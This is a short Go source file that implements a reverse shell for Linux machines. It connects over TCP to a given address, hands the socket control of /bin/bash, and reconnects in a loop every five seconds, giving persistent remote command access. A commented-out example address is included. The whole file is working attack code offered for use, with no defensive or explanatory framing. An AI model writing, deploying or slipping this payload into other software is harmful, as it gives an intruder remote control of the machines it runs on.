package linux

/*
  Revshell for any linux box that has bin/sh installed
*/

import (
  "net"
  "time"
  "os/exec"
)

type Shell interface{
  RevShell()
}

type Commands struct{
  address string
}

func(com Commands) RevShell(){
  c,err := net.Dial("tcp",com.address)
  if nil != err {
    if nil != c {
      c.Close()
    }
    time.Sleep(time.Second * 5)
    com.RevShell()
  }
  cmd := exec.Command("/bin/bash")
  cmd.Stdin,cmd.Stdout,cmd.Stderr = c,c,c
  cmd.Run()
  c.Close()
  com.RevShell()
}

func LinuxShell(addr string){
  //addr := "192.168.1.21:55677"
  var s Shell
  s = Commands{addr}
  s.RevShell()
}
